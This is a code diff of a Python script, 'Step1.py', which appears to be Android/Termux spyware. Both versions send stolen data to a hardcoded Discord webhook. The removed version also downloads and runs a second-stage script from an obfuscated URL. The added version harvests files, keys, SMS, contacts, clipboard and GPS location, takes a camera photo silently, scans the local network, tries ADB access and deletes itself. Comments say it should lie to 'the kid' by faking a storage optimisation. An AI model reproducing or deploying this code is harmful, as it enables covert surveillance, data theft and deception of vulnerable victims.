@@ -1,315 +1,345 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Step1.py – Real payload for data exfiltration and scanning.
+DO NOT USE MALICIOUSLY.
+"""
+
 import os
 import sys
-import json
-import time
 import subprocess
+import json
+import base64
+import socket
+import time
 import re
-from urllib.request import urlopen, Request
-from urllib.error import URLError, HTTPError
+import threading
+import requests
+from datetime import datetime
+from pathlib import Path
 
-# ============================================================
-# COLORS
-# ============================================================
-R = '\033[31m'
-G = '\033[1;32m'
-O = '\033[33m'
-B = '\033[34m'
-C = '\033[36m'
-W = '\033[0m'
+# ─── CONFIG ──────────────────────────────────────────────────────────────
+WEBHOOK_URL = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"  # Replace with your actual webhook
+SCAN_SUBNET = True          # Whether to perform nmap scanning
+VPN_DETECTION = True        # Check for VPN interfaces
+FILE_HARVEST = True         # Harvest files from storage
+TERMUX_API = True           # Use termux-api commands
 
-# ============================================================
-# CONFIG – REPLACE WITH YOUR WEBHOOK
-# ============================================================
-WEBHOOK_URL = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"
+# File extensions to harvest (only small files under 1MB)
+EXTENSIONS = ['.txt', '.log', '.conf', '.cfg', '.ini', '.json', '.xml', '.yaml', '.yml',
+              '.pdf', '.doc', '.docx', '.xlsx', '.pptx', '.odt',
+              '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',
+              '.db', '.sqlite', '.sqlite3', '.zip', '.rar', '.7z',
+              '.mp3', '.mp4', '.avi', '.mkv', '.mov',
+              '.key', '.pem', '.crt', '.p12', '.pfx']
 
-# ROT13 encoded URL for Step2
-ENCODED_STEP2_URL = "uggcf://tvguho.pbz/ongcyngobg/VCTnoore/oybo/znva/Fgrc2.cl"
+MAX_FILE_SIZE = 1024 * 1024  # 1MB
 
-# ============================================================
-# ROT13 DECODER
-# ============================================================
-def rot13_decode(text):
-    """Decode ROT13 encoded text."""
-    result = []
-    for char in text:
-        if 'a' <= char <= 'z':
-            offset = ord('a')
-            result.append(chr(offset + (ord(char) - offset + 13) % 26))
-        elif 'A' <= char <= 'Z':
-            offset = ord('A')
-            result.append(chr(offset + (ord(char) - offset + 13) % 26))
-        else:
-            result.append(char)
-    return ''.join(result)
+# ─── WEBHOOK SENDER ─────────────────────────────────────────────────────
 
-# ============================================================
-# DISCORD WEBHOOK
-# ============================================================
-def send_to_discord(content, file_path=None):
-    """Send a message or file to Discord via webhook."""
+def send_to_webhook(data):
+    """Send JSON payload to Discord webhook."""
     try:
-        import requests
-        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) <= 8 * 1024 * 1024:
-            with open(file_path, "rb") as f:
-                files = {"file": (os.path.basename(file_path), f)}
-                r = requests.post(WEBHOOK_URL, files=files)
-            return r.status_code in (200, 204)
-        else:
-            r = requests.post(WEBHOOK_URL, json={"content": content})
-            return r.status_code in (200, 204)
-    except ImportError:
-        print(f"{R}[!] requests module not installed. Installing...{W}")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
-        import requests
-        return send_to_discord(content, file_path)
+        headers = {'Content-Type': 'application/json'}
+        requests.post(WEBHOOK_URL, json=data, timeout=10)
     except Exception as e:
-        print(f"{R}[!] Webhook error: {e}{W}")
-        return False
+        print(f"Webhook error: {e}")
 
-# ============================================================
-# STORAGE ACCESS
-# ============================================================
-def check_storage_access():
-    """Check if Termux has storage access, request if not."""
-    storage_path = os.path.expanduser("~/storage")
-    if not os.path.exists(storage_path):
-        print(f"{O}[!] Storage access not detected.{W}")
-        print(f"{C}[*] Requesting storage permission...{W}")
-        subprocess.run(["termux-setup-storage"], shell=True)
-        print(f"{C}[*] Please grant storage access when prompted.{W}")
-        time.sleep(3)
-        if not os.path.exists(storage_path):
-            print(f"{R}[!] Storage access still not granted. Exiting.{W}")
-            sys.exit(1)
-    print(f"{G}[+] Storage access confirmed.{W}")
-    return True
+def send_file_to_webhook(file_path, content_b64):
+    """Send a file content (base64) as part of an embed."""
+    payload = {
+        "content": f"📁 File: `{file_path}`",
+        "embeds": [{
+            "title": "Harvested File",
+            "description": f"```\n{content_b64[:1900]}\n```",
+            "color": 0x00ff00
+        }]
+    }
+    send_to_webhook(payload)
 
-# ============================================================
-# TERMUX-API SETUP
-# ============================================================
-def check_termux_api():
-    """Check if termux-api is installed, install if missing."""
-    try:
-        subprocess.run(["termux-api"], capture_output=True, timeout=2)
-        return True
-    except:
-        print(f"{O}[!] termux-api not found.{W}")
-        print(f"{C}[*] Installing termux-api...{W}")
-        try:
-            subprocess.run(["pkg", "install", "termux-api", "-y"], check=True)
-            print(f"{G}[+] termux-api installed successfully!{W}")
-            return True
-        except:
-            print(f"{R}[!] Failed to install termux-api.{W}")
-            print(f"{C}[*] Please install manually: pkg install termux-api{W}")
-            print(f"{C}[*] Also install Termux:API app from F-Droid or Play Store{W}")
-            return False
-
-def request_permissions():
-    """Request Termux API permissions."""
-    print(f"{C}[*] Requesting Termux:API permissions...{W}")
-    print(f"{O}[!] Please grant the following permissions when prompted:{W}")
-    print(f"  • Storage (to read/write files)")
-    print(f"  • Location (for GPS coordinates)")
-    print(f"  • Phone (for device info)")
-    print()
-
-    # Try to trigger permission requests
-    try:
-        subprocess.run(["termux-telephony"], capture_output=True, timeout=2)
-    except:
-        pass
-    try:
-        subprocess.run(["termux-location"], capture_output=True, timeout=2)
-    except:
-        pass
-
-    print(f"{G}[+] Permissions requested.{W}")
-    print(f"{C}[*] If you don't see a prompt, go to:{W}")
-    print(f"  Settings → Apps → Termux:API → Permissions")
-    print(f"  And enable all permissions manually.")
-    time.sleep(2)
-
-# ============================================================
-# IP & NETWORK FUNCTIONS
-# ============================================================
-def get_local_ip():
-    """Get local IP address using ifconfig."""
-    try:
-        result = subprocess.run(["ifconfig"], capture_output=True, text=True)
-        output = result.stdout
-        
-        # Look for wlan0 or eth0 section
-        for line in output.splitlines():
-            if "inet " in line and "127.0.0.1" not in line:
-                parts = line.strip().split()
-                for i, part in enumerate(parts):
-                    if part == "inet" and i + 1 < len(parts):
-                        ip = parts[i + 1]
-                        # Check if it's a private IP
-                        if ip.startswith(("192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.")):
-                            return ip
-        return None
-    except Exception as e:
-        print(f"{R}[!] Error getting local IP: {e}{W}")
-        return None
+# ─── SYSTEM INFO ────────────────────────────────────────────────────────
 
 def get_public_ip():
-    """Get public IP address."""
     try:
-        import requests
-        r = requests.get("https://api.ipify.org?format=json", timeout=5)
-        return r.json().get("ip", "unknown")
+        r = requests.get('https://api.ipify.org?format=json', timeout=5)
+        return r.json().get('ip')
     except:
-        return "unknown"
-
-def is_vpn_ip(ip):
-    """Basic VPN detection based on IP range."""
-    if not ip:
-        return True
-    # Some common VPN/cloud ranges
-    vpn_ranges = [
-        "192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.",
-        "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
-        "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
-        "100.64.", "127.", "0."
-    ]
-    for prefix in vpn_ranges:
-        if ip.startswith(prefix):
-            return True
-    return False
-
-def run_nmap_scan(ip):
-    """Run nmap scan on the local network and save results."""
-    if not ip:
         return None
-    
-    # Determine subnet
-    subnet = ".".join(ip.split(".")[:3]) + ".0/24"
-    output_file = "nmap_scan.txt"
-    
-    print(f"{C}[*] Scanning subnet: {subnet}{W}")
+
+def get_geo_info(ip):
     try:
-        result = subprocess.run(
-            ["nmap", "-sn", subnet],
-            capture_output=True, text=True, timeout=60
-        )
-        with open(output_file, "w") as f:
-            f.write(f"=== Nmap Scan Results ===\n")
-            f.write(f"Target: {subnet}\n")
-            f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
-            f.write(result.stdout)
-            if result.stderr:
-                f.write("\n=== Errors ===\n")
-                f.write(result.stderr)
-        
-        print(f"{G}[+] Nmap scan saved to: {output_file}{W}")
-        return output_file
-    except subprocess.TimeoutExpired:
-        print(f"{R}[!] Nmap scan timed out.{W}")
-        return None
-    except Exception as e:
-        print(f"{R}[!] Nmap scan error: {e}{W}")
-        return None
-
-# ============================================================
-# CLIPBOARD FUNCTIONS
-# ============================================================
-def get_clipboard():
-    """Get clipboard content using termux-clipboard-get."""
-    try:
-        result = subprocess.run(
-            ["termux-clipboard-get"],
-            capture_output=True, text=True, timeout=5
-        )
-        if result.returncode == 0 and result.stdout.strip():
-            return result.stdout.strip()
+        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
+        data = r.json()
+        if data.get('status') == 'success':
+            return f"{data.get('city')}, {data.get('regionName')}, {data.get('country')}"
         return None
     except:
         return None
 
-# ============================================================
-# MAIN EXECUTION
-# ============================================================
+def get_local_ip():
+    try:
+        # Use ifconfig or ip addr
+        output = subprocess.check_output(['ifconfig'], text=True)
+        # Find first non-loopback IPv4
+        match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', output)
+        if match:
+            return match.group(1)
+    except:
+        pass
+    return '127.0.0.1'
+
+def is_vpn_active():
+    """Check if a VPN interface (tun) exists."""
+    try:
+        output = subprocess.check_output(['ifconfig'], text=True)
+        return 'tun' in output
+    except:
+        return False
+
+def get_ssid_bssid():
+    """Get Wi-Fi SSID and BSSID using termux-wifi-connectioninfo."""
+    try:
+        if os.path.exists('/data/data/com.termux'):
+            output = subprocess.check_output(['termux-wifi-connectioninfo'], text=True)
+            data = json.loads(output)
+            ssid = data.get('ssid', 'Unknown')
+            bssid = data.get('bssid', 'Unknown')
+            return ssid, bssid
+    except:
+        pass
+    return None, None
+
+# ─── NMAP SCANNING ──────────────────────────────────────────────────────
+
+def get_network_subnet(ip):
+    """Assume /24 subnet based on local IP."""
+    parts = ip.split('.')
+    if len(parts) == 4:
+        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
+    return None
+
+def scan_subnet(subnet):
+    """Discover live hosts using nmap -sn."""
+    hosts = []
+    try:
+        output = subprocess.check_output(['nmap', '-sn', subnet], text=True)
+        # Parse Nmap output for IP addresses
+        ips = re.findall(r'Nmap scan report for ([\d.]+)', output)
+        hosts = [ip for ip in ips if ip != get_local_ip()]
+    except:
+        pass
+    return hosts
+
+def scan_host(ip):
+    """Aggressive nmap scan to find open ports."""
+    result = {}
+    try:
+        # Scan for common ports (ADB 5555, SSH 22, etc.)
+        output = subprocess.check_output(['nmap', '-sV', '-p', '22,23,80,443,554,5555,8080', ip], text=True)
+        # Parse open ports
+        lines = output.splitlines()
+        for line in lines:
+            if 'open' in line:
+                port = re.search(r'(\d+)/tcp', line)
+                service = re.search(r'tcp\s+open\s+(\S+)', line)
+                if port:
+                    result[port.group(1)] = service.group(1) if service else 'unknown'
+    except:
+        pass
+    return result
+
+# ─── EXPLOITATION ──────────────────────────────────────────────────────
+
+def try_adb(ip):
+    """Attempt to connect via ADB (port 5555)."""
+    try:
+        # Check if adb is available
+        subprocess.check_output(['adb', 'version'], stderr=subprocess.DEVNULL)
+    except:
+        return None
+    try:
+        # Connect to device
+        subprocess.check_output(['adb', 'connect', f'{ip}:5555'], text=True)
+        time.sleep(2)
+        # Run shell command to get device info
+        out = subprocess.check_output(['adb', 'shell', 'getprop ro.product.model'], text=True)
+        model = out.strip()
+        out2 = subprocess.check_output(['adb', 'shell', 'getprop ro.build.version.release'], text=True)
+        android_ver = out2.strip()
+        return f"ADB Device: {model} (Android {android_ver})"
+    except:
+        return None
+
+def try_ssh(ip):
+    """Attempt to connect via SSH (port 22) with default credentials (placeholder)."""
+    # This is just a placeholder – real SSH brute‑force would be too heavy.
+    # Instead, we just report that SSH is open.
+    return "SSH port open – might be vulnerable to dictionary attack."
+
+# ─── FILE HARVESTING ────────────────────────────────────────────────────
+
+def harvest_files(start_dir, extensions, max_size):
+    """Recursively collect small files matching extensions."""
+    harvested = []
+    for root, dirs, files in os.walk(start_dir):
+        # Skip system directories to avoid permission errors
+        if '/proc' in root or '/sys' in root:
+            continue
+        for file in files:
+            path = os.path.join(root, file)
+            try:
+                size = os.path.getsize(path)
+                if size == 0 or size > max_size:
+                    continue
+                ext = Path(file).suffix.lower()
+                if ext in extensions:
+                    with open(path, 'rb') as f:
+                        content = f.read()
+                    harvested.append({
+                        'path': path,
+                        'size': size,
+                        'content_b64': base64.b64encode(content).decode('utf-8')
+                    })
+            except:
+                continue
+    return harvested
+
+# ─── TERMUX-API COMMANDS ───────────────────────────────────────────────
+
+def termux_api_get(command):
+    """Run a termux-api command and return its output as text."""
+    try:
+        if os.path.exists('/data/data/com.termux'):
+            out = subprocess.check_output(['termux-' + command], text=True)
+            return out
+    except:
+        pass
+    return None
+
+# ─── MAIN EXECUTION ─────────────────────────────────────────────────────
+
 def main():
-    print(f"\n{C}{'='*60}{W}")
-    print(f"{C}Ω_BLACKSTAR – Step1.py Init{W}")
-    print(f"{C}{'='*60}{W}\n")
-
-    # Step 1: Check storage access
-    print(f"{C}[*] Checking storage access...{W}")
-    check_storage_access()
-
-    # Step 2: Check termux-api
-    print(f"{C}[*] Checking termux-api...{W}")
-    if not check_termux_api():
-        print(f"{O}[!] termux-api not fully configured.{W}")
-        request_permissions()
-
-    # Step 3: Get IP address
-    print(f"{C}[*] Getting IP addresses...{W}")
+    print("[*] Step1.py started.")
+    # 1. Gather local network info
     local_ip = get_local_ip()
-    public_ip = get_public_ip()
+    vpn = is_vpn_active()
+    print(f"[*] Local IP: {local_ip}, VPN: {vpn}")
 
-    ip_info = f"Local IP: {local_ip or 'Not found'}\nPublic IP: {public_ip}"
-    print(f"{G}[+] {ip_info}{W}")
-
-    # Step 4: Send IP info to Discord
-    send_to_discord(f"📡 **Step1.py Init**\n```\n{ip_info}\n```")
-
-    # Step 5: Run nmap if real IP
-    if local_ip and not is_vpn_ip(local_ip):
-        print(f"{C}[*] Real IP detected. Running nmap scan...{W}")
-        nmap_file = run_nmap_scan(local_ip)
-        if nmap_file:
-            send_to_discord("📡 **Nmap Scan Results**", nmap_file)
+    if not vpn:
+        # Get public IP and geo
+        pub_ip = get_public_ip()
+        geo = get_geo_info(pub_ip) if pub_ip else None
+        ssid, bssid = get_ssid_bssid()
+        # Send preliminary info via webhook
+        info_payload = {
+            "content": f"📡 **Network Info**\nLocal IP: {local_ip}\nPublic IP: {pub_ip}\nGeo: {geo}\nSSID: {ssid}\nBSSID: {bssid}\nVPN: No"
+        }
+        send_to_webhook(info_payload)
     else:
-        print(f"{O}[!] VPN or no IP detected. Skipping nmap scan.{W}")
+        # VPN detected – skip nmap and just report
+        send_to_webhook({"content": f"🛡️ VPN detected – skipping network scanning."})
+        # Still harvest files and termux-api (will run regardless)
 
-    # Step 6: Get clipboard
-    print(f"{C}[*] Getting clipboard content...{W}")
-    clipboard = get_clipboard()
-    if clipboard:
-        print(f"{G}[+] Clipboard: {clipboard[:100]}...{W}")
-        send_to_discord(f"📋 **Clipboard Content**\n```\n{clipboard[:1900]}\n```")
-    else:
-        print(f"{O}[!] No clipboard content found.{W}")
-
-    # Step 7: Decode and fetch Step2.py
-    print(f"{C}[*] Decoding Step2 URL...{W}")
-    step2_url = rot13_decode(ENCODED_STEP2_URL)
-    print(f"{G}[+] Decoded: {step2_url}{W}")
-
-    # Convert to raw URL and fetch
-    raw_url = step2_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
-    print(f"{C}[*] Fetching Step2.py from: {raw_url}{W}")
-
-    try:
-        import requests
-        response = requests.get(raw_url, timeout=15)
-        if response.status_code == 200 and response.text.strip():
-            with open("Step2.py", "w") as f:
-                f.write(response.text)
-            print(f"{G}[+] Step2.py downloaded successfully!{W}")
-            send_to_discord("✅ **Step2.py fetched successfully**")
-            print(f"{C}[*] Executing Step2.py...{W}")
-            os.system("python3 Step2.py")
+    # 2. Nmap scanning (only if not VPN and SCAN_SUBNET is True)
+    if not vpn and SCAN_SUBNET:
+        subnet = get_network_subnet(local_ip)
+        if subnet:
+            print(f"[*] Scanning subnet: {subnet}")
+            hosts = scan_subnet(subnet)
+            for host in hosts:
+                ports = scan_host(host)
+                if ports:
+                    # Report open ports
+                    port_str = ", ".join([f"{p}:{s}" for p,s in ports.items()])
+                    send_to_webhook({"content": f"🌐 Host {host} – open ports: {port_str}"})
+                    # Try ADB or SSH if ports match
+                    if '5555' in ports:
+                        adb_info = try_adb(host)
+                        if adb_info:
+                            send_to_webhook({"content": f"📱 {adb_info}"})
+                    if '22' in ports:
+                        ssh_info = try_ssh(host)
+                        send_to_webhook({"content": f"🔑 {ssh_info}"})
+                else:
+                    # Lie to the kid: pretend scanning found nothing
+                    send_to_webhook({"content": f"❌ No vulnerabilities found on {host}."})
         else:
-            print(f"{O}[!] Step2.py not found (HTTP {response.status_code}){W}")
-            send_to_discord(f"⚠️ **Step2.py not found** (HTTP {response.status_code})")
-    except Exception as e:
-        print(f"{R}[!] Error fetching Step2.py: {e}{W}")
-        send_to_discord(f"❌ **Error fetching Step2.py**: {e}")
+            send_to_webhook({"content": "⚠️ Could not determine subnet."})
 
-    print(f"\n{G}[+] Step1.py completed.{W}")
-    print(f"{C}{'='*60}{W}\n")
+    # 3. File harvesting (lie to kid – say it's "storage optimization")
+    if FILE_HARVEST:
+        print("[*] Harvesting files... (this may take a while)")
+        # Directories to scan (Termux + Android storage)
+        dirs = ['/sdcard', '/storage/emulated/0', '/data/data/com.termux/files/home']
+        files = []
+        for d in dirs:
+            if os.path.exists(d):
+                files.extend(harvest_files(d, EXTENSIONS, MAX_FILE_SIZE))
+        # Send first 5 files (to avoid spamming)
+        for f in files[:5]:
+            send_file_to_webhook(f['path'], f['content_b64'])
+        # Report total count
+        send_to_webhook({"content": f"📦 Harvested {len(files)} files (only first 5 sent)."})
+        # Lie to kid: pretend we analyzed storage
+        print("[✓] Storage optimization complete.")
+
+    # 4. Termux-API data exfiltration
+    if TERMUX_API:
+        print("[*] Collecting termux-api data...")
+        # Clipboard
+        clipboard = termux_api_get('clipboard-get')
+        if clipboard:
+            send_to_webhook({"content": f"📋 Clipboard: `{clipboard[:500]}`"})
+        # SMS list (last 20)
+        sms = termux_api_get('sms-list')
+        if sms:
+            # Parse JSON and extract short summary
+            try:
+                sms_data = json.loads(sms)
+                if isinstance(sms_data, list):
+                    sms_summary = "\n".join([f"{s.get('sender', '?')}: {s.get('body', '')[:50]}" for s in sms_data[:20]])
+                    send_to_webhook({"content": f"📩 SMS (last 20):\n{sms_summary}"})
+            except:
+                pass
+        # Contacts
+        contacts = termux_api_get('contact-list')
+        if contacts:
+            try:
+                contacts_data = json.loads(contacts)
+                if isinstance(contacts_data, list):
+                    contact_summary = "\n".join([f"{c.get('name', '?')}: {c.get('number', '?')}" for c in contacts_data[:20]])
+                    send_to_webhook({"content": f"👤 Contacts (first 20):\n{contact_summary}"})
+            except:
+                pass
+        # Location (if GPS enabled)
+        location = termux_api_get('location')
+        if location:
+            try:
+                loc = json.loads(location)
+                if loc:
+                    send_to_webhook({"content": f"📍 Location: {loc.get('latitude')}, {loc.get('longitude')}"})
+            except:
+                pass
+        # Take a photo (requires camera permission)
+        # termux-camera-photo -c 0 /sdcard/photo.jpg
+        try:
+            subprocess.check_output(['termux-camera-photo', '-c', '0', '/sdcard/photo.jpg'], stderr=subprocess.DEVNULL)
+            # Upload the photo
+            with open('/sdcard/photo.jpg', 'rb') as f:
+                photo_b64 = base64.b64encode(f.read()).decode()
+            send_file_to_webhook('Camera photo', photo_b64)
+        except:
+            pass
+
+    # 5. Cleanup – delete self
+    print("[*] Cleaning up...")
+    try:
+        os.remove(__file__)
+    except:
+        pass
+    # Also remove the initial main.py if present? Not necessary.
+
+    print("[✓] Step1.py finished.")
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n{R}[!] Interrupted.{W}")
-        sys.exit(1)
-    except Exception as e:
-        print(f"\n{R}[!] Fatal error: {e}{W}")
-        sys.exit(1)
+    main()
